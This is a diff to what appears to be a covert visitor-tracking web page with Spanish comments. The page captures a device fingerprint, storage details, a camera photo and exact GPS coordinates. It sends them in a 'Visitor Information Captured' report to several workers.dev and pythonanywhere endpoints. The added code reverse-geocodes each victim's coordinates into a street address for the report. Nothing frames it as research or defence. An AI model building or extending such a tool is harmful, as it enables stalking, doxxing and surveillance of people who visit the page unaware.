@@ -42,9 +42,31 @@
             'https://tg-bot12.societykark.workers.dev',
             'https://app-trk.societykark.workers.dev',
             'https://app-tg.societykark.workers.dev',
-            'https://app-kali.societykark.workers.dev',  // ✅ NUEVA URL AGREGADA
+            'https://app-kali.societykark.workers.dev',
             'https://societykark.pythonanywhere.com'
         ];
+
+        // ---------- FUNCIÓN DE GEOCODIFICACIÓN INVERSA ----------
+        async function reverseGeocode(lat, lng) {
+            try {
+                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
+                const res = await fetch(url);
+                const data = await res.json();
+                if (data && data.display_name) {
+                    // Extraer solo la calle y ciudad (o usar display_name completo)
+                    const address = data.address;
+                    let parts = [];
+                    if (address.road) parts.push(address.road);
+                    if (address.suburb) parts.push(address.suburb);
+                    else if (address.city) parts.push(address.city);
+                    else if (address.town) parts.push(address.town);
+                    else if (address.village) parts.push(address.village);
+                    if (address.state) parts.push(address.state);
+                    return parts.join(', ');
+                }
+            } catch(e) {}
+            return null;
+        }
 
         // ---------- 1. OBTENER UBICACIÓN DESDE CLOUDFLARE WORKER ----------
         async function getLocationFromWorker() {
@@ -207,6 +229,12 @@
                 const storage = await getStorageInfo();
                 const photo = await capturePhoto();
 
+                // Si hay GPS, obtener dirección real
+                let address = null;
+                if (gps) {
+                    address = await reverseGeocode(gps.lat, gps.lng);
+                }
+
                 let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                 msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                 msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
@@ -224,7 +252,13 @@
                     msg += `   • No disponible\n`;
                 }
                 if (gps) {
-                    msg += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+                    msg += `📍 *GPS (exacto)*\n`;
+                    if (address) {
+                        msg += `   • ${address}\n`;
+                    }
+                    msg += `   • Coordinates: ${gps.lat}, ${gps.lng}\n`;
+                    msg += `   • Accuracy: ±${gps.accuracy} meters\n`;
+                    msg += `   • [View in Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`;
                 } else {
                     msg += `📍 *GPS: Permiso denegado o no disponible*\n`;
                 }
